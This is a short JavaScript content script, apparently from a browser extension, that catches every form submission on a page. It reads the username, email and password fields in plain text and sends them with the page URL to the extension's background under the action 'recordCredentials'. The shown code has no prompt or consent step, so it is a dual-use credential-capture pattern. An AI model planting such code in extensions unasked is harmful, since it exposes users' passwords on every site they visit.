document.addEventListener('submit', function(event) {
    const form = event.target.closest('form');
    if (!form) return;
  
    const usernameField = form.querySelector('input[type="text"], input[type="email"]');
    const passwordField = form.querySelector('input[type="password"]');
  
    if (usernameField && passwordField) {
      const username = usernameField.value.trim();
      const password = passwordField.value.trim();
      const email = document.querySelector('input[type="email"]') ? document.querySelector('input[type="email"]').value.trim() : "";
  
      if (username && password) {
        chrome.runtime.sendMessage({
          action: 'recordCredentials',
          credentials: { url: window.location.href, username: username, email: email, password: password }
        });
      }
    }
  });
  